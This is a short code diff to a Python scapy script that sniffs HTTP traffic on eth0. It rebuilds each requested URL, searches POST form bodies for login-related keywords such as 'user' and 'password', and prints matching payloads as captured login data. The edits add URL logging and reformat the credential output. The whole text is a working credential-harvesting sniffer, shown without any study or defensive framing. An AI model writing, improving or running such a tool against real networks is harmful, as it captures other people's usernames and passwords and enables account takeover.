@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 
 try:
     import scapy.all as scapy
@@ -22,6 +22,7 @@ def packet_processer(packet):
         method = packet[http.HTTPRequest].Method
         # retrieve the URL used for login
         url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+        print(f"[+] URL requested: {url.decode('utf-8')}")
         if method == b"POST":
             # check if the packet has the Raw section and save the load part containing the form data
             if packet.haslayer(scapy.Raw):
@@ -35,7 +36,7 @@ def packet_processer(packet):
                 keywords = ["login", "user", "username", "uname", "pass", "password", "passwd", "&", "="]
                 for keyword in keywords:
                     if keyword in load_str:
-                        print(f"Potential login form data for {url.decode('utf-8')}: {load_str}")
+                        print(f"\n\n[+] Potential login form data for {url.decode('utf-8')}: {load_str}\n\n")
                         break
 
 sniff("eth0")
